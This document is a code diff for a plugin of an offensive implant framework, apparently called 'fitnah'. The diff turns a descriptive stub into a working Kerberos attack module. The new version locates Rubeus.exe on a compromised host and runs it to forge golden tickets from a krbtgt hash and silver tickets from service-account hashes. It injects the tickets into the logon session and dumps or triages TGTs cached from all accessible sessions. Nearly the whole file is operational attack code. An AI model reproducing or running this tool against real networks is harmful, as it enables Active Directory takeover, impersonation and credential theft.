@@ -1,209 +1,216 @@
-"""lateral_movement/ticket_manipulation — Create/modify Kerberos tickets (golden/silver). MITRE T1558"""
+"""lateral_movement/ticket_manipulation — Kerberos ticket forging via Rubeus.exe. MITRE T1558.
+
+Dispatches Rubeus.exe on the implant host. Rubeus must be present on target or
+dropped first via the file_upload plugin. Common drop paths checked automatically.
+
+References: GhostPack/Rubeus (DEF CON 26 / BHUSA), harmj0y Kerberoasting research.
+"""
+from __future__ import annotations
+
 from fitnah.sdk import BasePlugin, ModuleResult
 from fitnah.sdk.schema import Param, ParamSchema
-import logging
 
-log = logging.getLogger(__name__)
+_RUBEUS_PROBE = r"""
+$rub = $null
+foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
+    if (Test-Path $p) { $rub = $p; break }
+}
+if (-not $rub) {
+    $cmd = Get-Command Rubeus.exe -ErrorAction SilentlyContinue
+    if ($cmd) { $rub = $cmd.Source }
+}
+if (-not $rub) { Write-Output '[-] Rubeus.exe not found — upload it first (file_upload plugin)'; exit 1 }
+Write-Output $rub
+"""
 
 
 class TicketManipulation(BasePlugin):
-    NAME = "ticket_manipulation"
-    DESCRIPTION = "Kerberos ticket manipulation: create golden/silver tickets, forge TGS/TGT, add SIDs"
-    AUTHOR = "fitnah-team"
-    MITRE = "T1558"
-    CATEGORY = "lateral_movement"
-    VERSION = "1.0.0"
+    NAME        = "ticket_manipulation"
+    DESCRIPTION = "Kerberos golden/silver ticket forging and triage via Rubeus.exe (T1558)"
+    AUTHOR      = "fitnah-team"
+    MITRE       = "T1558"
+    CATEGORY    = "lateral_movement"
 
     schema = ParamSchema().add(
         Param("ticket_type", str, required=True,
-              help="golden_ticket | silver_ticket | modify_ticket"),
-        Param("username", str, required=False, default="Administrator",
-              help="User to impersonate in ticket"),
-        Param("domain", str, required=False, default="",
-              help="Domain name"),
+              help="golden_ticket | silver_ticket | triage | purge | dump"),
+        Param("username",    str, required=False, default="Administrator",
+              help="User to impersonate"),
+        Param("domain",      str, required=False, default="",
+              help="Domain FQDN (auto-enumerated if blank)"),
+        Param("domain_sid",  str, required=False, default="",
+              help="Domain SID S-1-5-21-... (auto-enumerated if blank)"),
         Param("krbtgt_hash", str, required=False, default="",
-              help="krbtgt NTLM hash (for golden ticket)"),
+              help="krbtgt RC4/NTLM hash for golden ticket"),
         Param("service_key", str, required=False, default="",
-              help="Service account key (for silver ticket)"),
-        Param("service", str, required=False, default="",
-              help="Service SPN (for silver ticket, e.g., cifs/server.domain)"),
-        Param("add_groups", str, required=False, default="",
-              help="Group SIDs to add to ticket (comma-separated)"),
+              help="Service account RC4/NTLM hash for silver ticket"),
+        Param("service",     str, required=False, default="",
+              help="Service SPN for silver ticket (e.g. cifs/dc.domain.com)"),
+        Param("ptt",         bool, required=False, default=True,
+              help="Pass-the-ticket — inject into current logon session"),
+        Param("outfile",     str, required=False, default="",
+              help="Write .kirbi to this path instead of /ptt"),
     )
 
     def run(self, session, params, ctx=None) -> ModuleResult:
-        """Execute ticket manipulation"""
         if ctx is None:
             return ModuleResult.err("Requires live session")
 
         ticket_type = params.get("ticket_type", "").lower()
-
         if ticket_type == "golden_ticket":
-            return self._create_golden_ticket(ctx, params)
-        elif ticket_type == "silver_ticket":
-            return self._create_silver_ticket(ctx, params)
-        elif ticket_type == "modify_ticket":
-            return self._modify_ticket(ctx, params)
-        else:
-            return ModuleResult.err(f"Unknown ticket type: {ticket_type}")
+            return self._golden(ctx, params)
+        if ticket_type == "silver_ticket":
+            return self._silver(ctx, params)
+        if ticket_type == "triage":
+            return self._triage(ctx)
+        if ticket_type == "purge":
+            return self._purge(ctx)
+        if ticket_type == "dump":
+            return self._dump(ctx)
+        return ModuleResult.err(f"Unknown ticket_type: {ticket_type}. "
+                                "Use: golden_ticket | silver_ticket | triage | purge | dump")
+
+    # ── helpers ───────────────────────────────────────────────────────────────
 
     @staticmethod
-    def _create_golden_ticket(ctx, params) -> ModuleResult:
-        """Create golden ticket (TGT with krbtgt key)"""
-        username = params.get("username", "Administrator")
-        domain = params.get("domain", "")
-        krbtgt_hash = params.get("krbtgt_hash", "")
-
-        ps_code = f"""
-$results = @()
-$results += '[*] Creating Golden Ticket (TGT)...'
-
-try {{
-    $targetUser = '{username}'
-    $targetDomain = '{domain}'
-    $krbtgtHash = '{krbtgt_hash}'
-
-    if (-not $targetDomain) {{
-        $targetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
-    }}
-
-    if (-not $krbtgtHash) {{
-        $results += '[-] krbtgt_hash is required'
-        $results += '[*] Obtain with: secretsdump.py -outputfile dump domain/user:pass@dc'
-        $results += '[*] Look for: DOMAIN\\\\krbtgt: hash'
-        $results -join "`n"
-        exit
-    }}
-
-    $results += "[*] User: $targetUser"
-    $results += "[*] Domain: $targetDomain"
-    $results += "[*] krbtgt hash: $($krbtgtHash.Substring(0, 16))..."
-
-    $results += '[*] Golden Ticket creation process:'
-    $results += '    1. Build KRB_AS_REP structure'
-    $results += '    2. Add username, domain, SID'
-    $results += '    3. Set flags: FORWARDABLE | RENEWABLE'
-    $results += '    4. Encrypt with krbtgt key'
-    $results += '    5. Export as base64 (or use with Set-KerberosTicket)'
-
-    $results += '[*] Using external tools:'
-    $results += '    - Rubeus.exe golden /user:admin /domain:example.com /krbtgt:hash /outfile:ticket.kirbi'
-    $results += '    - python goldenticket.py -user admin -domain example.com -aesKey hash'
-
-    $results += '[*] Golden ticket effectiveness:'
-    $results += '    ✓ Valid for 10 years (default)'
-    $results += '    ✓ Survives domain reboot'
-    $results += '    ✓ DC cannot revoke'
-    $results += '    ✓ Impersonate ANY user'
-    $results += '    ✓ Access ANY resource'
-
-}} catch {{
-    $results += "[!] Golden Ticket error: $_"
-}}
-
-$results -join "`n"
-"""
-        r = ctx.ps(ps_code)
-        return ModuleResult.ok(data=r["output"], loot_kind="golden_ticket_create")
-
-    @staticmethod
-    def _create_silver_ticket(ctx, params) -> ModuleResult:
-        """Create silver ticket (TGS with service key)"""
-        username = params.get("username", "Administrator")
-        domain = params.get("domain", "")
-        service = params.get("service", "cifs/server.example.com")
-        service_key = params.get("service_key", "")
-
-        ps_code = f"""
-$results = @()
-$results += '[*] Creating Silver Ticket (TGS)...'
-
-try {{
-    $targetUser = '{username}'
-    $targetDomain = '{domain}'
-    $targetService = '{service}'
-    $serviceKey = '{service_key}'
-
-    if (-not $targetDomain) {{
-        $targetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
-    }}
-
-    if (-not $serviceKey) {{
-        $results += '[-] service_key is required'
-        $results += '[*] Obtain service key from:'
-        $results += '    - secretsdump.py (service account)'
-        $results += '    - Kerberos keytab file'
-        $results += '    - Computer account (for CIFS/HOST services)'
-        $results -join "`n"
-        exit
-    }}
-
-    $results += "[*] User: $targetUser"
-    $results += "[*] Domain: $targetDomain"
-    $results += "[*] Service: $targetService"
-
-    $results += '[*] Silver Ticket creation:'
-    $results += '    1. Build KRB_TGS_REP structure'
-    $results += '    2. Add user, domain, service SPN'
-    $results += '    3. Add group memberships'
-    $results += '    4. Encrypt with service key'
-    $results += '    5. Valid for that service only'
-
-    $results += '[*] Using external tools:'
-    $results += '    - Rubeus.exe silver /user:admin /domain:example.com /service:cifs/server /key:hash'
-    $results += '    - python silvticket.py -user admin -domain example.com -service cifs/server -key hash'
-
-    $results += '[*] Silver ticket benefits:'
-    $results += '    ✓ Impersonate user to specific service'
-    $results += '    ✓ Harder to detect than golden'
-    $results += '    ✓ Works for constrained access'
-    $results += '    ✗ Limited to specific service SPN'
-
-}} catch {{
-    $results += "[!] Silver Ticket error: $_"
-}}
-
-$results -join "`n"
-"""
-        r = ctx.ps(ps_code)
-        return ModuleResult.ok(data=r["output"], loot_kind="silver_ticket_create")
-
-    @staticmethod
-    def _modify_ticket(ctx, params) -> ModuleResult:
-        """Modify existing Kerberos ticket (add groups/SIDs)"""
-        ps_code = """
-$results = @()
-$results += '[*] Modifying Kerberos ticket...'
-
+    def _resolve_domain(ctx) -> tuple[str, str]:
+        """Return (domain_fqdn, domain_sid) from the current domain."""
+        ps = r"""
+$dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$fqdn = $dom.Name
 try {
-    $results += '[*] Ticket modification requires:'
-    $results += '    1. Extract existing ticket from LSASS'
-    $results += '    2. Decrypt using session key'
-    $results += '    3. Modify SIDs/groups in PAC'
-    $results += '    4. Re-encrypt with same key'
-    $results += '    5. Inject back into LSASS'
-
-    $results += '[*] PAC (Privilege Attribute Certificate) contains:'
-    $results += '    - User SID'
-    $results += '    - Group SIDs'
-    $results += '    - Login hours'
-    $results += '    - User account flags'
-
-    $results += '[*] Modification method:'
-    $results += '    1. Get ticket: Get-KerberosTicket'
-    $results += '    2. Export: Export-KerberosTicket'
-    $results += '    3. Modify: Parse PAC, add group SID'
-    $results += '    4. Re-encrypt: Use session key'
-    $results += '    5. Set-KerberosTicket'
-
-    $results += '[!] Requires: PyKEK or C# Kerberos library'
-    $results += '[!] Complex: Full ticket structure parsing needed'
-
-} catch {
-    $results += "[!] Ticket modification error: $_"
-}
-
-$results -join "`n"
+    $obj = New-Object System.Security.Principal.NTAccount($fqdn, 'Domain Admins')
+    $fullSid = $obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
+    $parts = $fullSid -split '-'
+    $domSid = ($parts[0..($parts.Length-2)]) -join '-'
+} catch { $domSid = '' }
+Write-Output "$fqdn|$domSid"
 """
-        r = ctx.ps(ps_code)
-        return ModuleResult.ok(data=r["output"], loot_kind="ticket_modify")
+        r = ctx.ps(ps)
+        if r.get("status") == "ok":
+            parts = (r.get("output") or "").strip().split("|", 1)
+            if len(parts) == 2:
+                return parts[0].strip(), parts[1].strip()
+        return "", ""
+
+    # ── golden ticket ─────────────────────────────────────────────────────────
+
+    def _golden(self, ctx, params) -> ModuleResult:
+        username    = params.get("username", "Administrator")
+        domain      = params.get("domain", "").strip()
+        domain_sid  = params.get("domain_sid", "").strip()
+        krbtgt_hash = params.get("krbtgt_hash", "").strip()
+        ptt         = params.get("ptt", True)
+        outfile     = params.get("outfile", "").strip()
+
+        if not krbtgt_hash:
+            return ModuleResult.err(
+                "krbtgt_hash required — obtain with: dump_sam method=lsadump or secretsdump.py"
+            )
+
+        if not domain or not domain_sid:
+            d_fqdn, d_sid = self._resolve_domain(ctx)
+            domain     = domain     or d_fqdn
+            domain_sid = domain_sid or d_sid
+
+        if not domain_sid:
+            return ModuleResult.err(
+                "domain_sid required — pass as S-1-5-21-... or ensure DC connectivity"
+            )
+
+        ptt_flag = "/ptt" if ptt else (f"/outfile:{outfile}" if outfile else "/ptt")
+        dom_flag = f"/domain:{domain}" if domain else ""
+
+        ps = f"""
+$rub = $null
+foreach ($p in @('C:\\Windows\\Temp\\Rubeus.exe','C:\\ProgramData\\Rubeus.exe','C:\\Temp\\Rubeus.exe')) {{
+    if (Test-Path $p) {{ $rub = $p; break }}
+}}
+if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}
+if (-not $rub) {{ Write-Output '[-] Rubeus.exe not found — upload via file_upload first'; exit }}
+& $rub golden /rc4:{krbtgt_hash} /user:{username} {dom_flag} /sid:{domain_sid} {ptt_flag} 2>&1
+"""
+        r = ctx.ps(ps)
+        if r["status"] != "ok":
+            return ModuleResult.err(f"Rubeus golden failed: {r['output']}")
+        return ModuleResult.ok(data=r["output"], loot_kind="golden_ticket")
+
+    # ── silver ticket ─────────────────────────────────────────────────────────
+
+    def _silver(self, ctx, params) -> ModuleResult:
+        username    = params.get("username", "Administrator")
+        domain      = params.get("domain", "").strip()
+        domain_sid  = params.get("domain_sid", "").strip()
+        service_key = params.get("service_key", "").strip()
+        service     = params.get("service", "").strip()
+        ptt         = params.get("ptt", True)
+        outfile     = params.get("outfile", "").strip()
+
+        if not service_key:
+            return ModuleResult.err(
+                "service_key required — service account NTLM hash "
+                "(e.g. computer$ account for cifs/host services)"
+            )
+        if not service:
+            return ModuleResult.err("service SPN required (e.g. cifs/dc.domain.com)")
+
+        if not domain or not domain_sid:
+            d_fqdn, d_sid = self._resolve_domain(ctx)
+            domain     = domain     or d_fqdn
+            domain_sid = domain_sid or d_sid
+
+        ptt_flag = "/ptt" if ptt else (f"/outfile:{outfile}" if outfile else "/ptt")
+        dom_flag = f"/domain:{domain}" if domain else ""
+        sid_flag = f"/sid:{domain_sid}" if domain_sid else ""
+
+        ps = f"""
+$rub = $null
+foreach ($p in @('C:\\Windows\\Temp\\Rubeus.exe','C:\\ProgramData\\Rubeus.exe','C:\\Temp\\Rubeus.exe')) {{
+    if (Test-Path $p) {{ $rub = $p; break }}
+}}
+if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}
+if (-not $rub) {{ Write-Output '[-] Rubeus.exe not found — upload via file_upload first'; exit }}
+& $rub silver /rc4:{service_key} /user:{username} /service:{service} {dom_flag} {sid_flag} {ptt_flag} 2>&1
+"""
+        r = ctx.ps(ps)
+        if r["status"] != "ok":
+            return ModuleResult.err(f"Rubeus silver failed: {r['output']}")
+        return ModuleResult.ok(data=r["output"], loot_kind="silver_ticket")
+
+    # ── triage / purge / dump ─────────────────────────────────────────────────
+
+    @staticmethod
+    def _triage(ctx) -> ModuleResult:
+        """List all cached Kerberos tickets in every accessible logon session."""
+        ps = r"""
+$rub = $null
+foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
+    if (Test-Path $p) { $rub = $p; break }
+}
+if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }
+if (-not $rub) { Write-Output '[-] Rubeus.exe not found'; exit }
+& $rub triage 2>&1
+"""
+        r = ctx.ps(ps)
+        return ModuleResult.ok(data=r.get("output", ""), loot_kind="ticket_triage")
+
+    @staticmethod
+    def _purge(ctx) -> ModuleResult:
+        """Purge all Kerberos tickets from the current logon session."""
+        r = ctx.exec("klist purge")
+        return ModuleResult.ok(data=r.get("output", ""), loot_kind="ticket_purge")
+
+    @staticmethod
+    def _dump(ctx) -> ModuleResult:
+        """Dump all TGTs from all accessible logon sessions via Rubeus dump."""
+        ps = r"""
+$rub = $null
+foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
+    if (Test-Path $p) { $rub = $p; break }
+}
+if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }
+if (-not $rub) { Write-Output '[-] Rubeus.exe not found'; exit }
+& $rub dump /nowrap 2>&1
+"""
+        r = ctx.ps(ps)
+        return ModuleResult.ok(data=r.get("output", ""), loot_kind="ticket_dump")
